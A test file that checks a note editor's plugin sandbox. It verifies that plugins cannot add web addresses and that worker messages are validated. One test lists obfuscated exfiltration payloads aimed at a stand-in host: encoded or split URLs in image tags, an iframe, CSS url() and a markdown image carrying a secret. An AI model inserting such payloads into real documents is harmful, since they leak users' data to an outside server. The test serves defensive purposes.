import { describe, expect, it } from 'vitest';
import { addedWebAddress, isFromWorker, portArguments } from '../../src/renderer/plugins/sandbox/protocol';

describe('a sandboxed plugin’s change to a note', () => {
  const note = '# Title\n\nSee https://example.com/page for more.\nNext line.\n';

  it('may change the words and keep the addresses already there', () => {
    expect(addedWebAddress(note, note.toUpperCase().replace('HTTPS://EXAMPLE.COM/PAGE', 'https://example.com/page'))).toBeNull();
    expect(addedWebAddress(note, note.replace('Next line.', 'Another line.'))).toBeNull();
    expect(addedWebAddress(note, note.replace('# Title', '## Title'))).toBeNull();
  });

  it('may not add a web address, however it is written', () => {
    for (const added of [
      '![](https://evil.example/c?d=secret)',
      '<img src="//evil.example/x">',
      '<img src="https:&#47;&#47;evil.example/x">',
      '<img src="https&#x3a;//evil.example/x">',
      '<img src="https&colon;&sol;&sol;evil.example/x">',
      '<img src="https:\\\\evil.example/x">',
      '<img src="https:/\n/evil.example/x">',
      '<img src="ht\ntps://evil.example/x">',
      '<iframe src="https://evil.example"></iframe>',
      '<div style="background:url(HTTPS://EVIL.EXAMPLE/x)">',
    ]) {
      expect(addedWebAddress(note, `${note}\n${added}\n`), added).not.toBeNull();
    }
  });
});

describe('what the worker may send', () => {
  it('is checked before the editor acts on it', () => {
    expect(isFromWorker({ type: 'port', callId: 1, method: 'getMarkdown', args: [] })).toBe(true);
    expect(isFromWorker({ type: 'port', callId: 1, method: 'deleteFile', args: [] })).toBe(false);
    expect(isFromWorker({ type: 'register', kind: 'menu', key: 'x' })).toBe(false);
    expect(isFromWorker({ type: 'notice', message: 'x'.repeat(2001) })).toBe(false);
    expect(isFromWorker(null)).toBe(false);
    expect(portArguments('replaceMarkdown', [42])).toBeNull();
    expect(portArguments('setSemanticFocus', ['yes'])).toBeNull();
    expect(portArguments('replaceMarkdown', ['text'])).toEqual(['text']);
  });
});
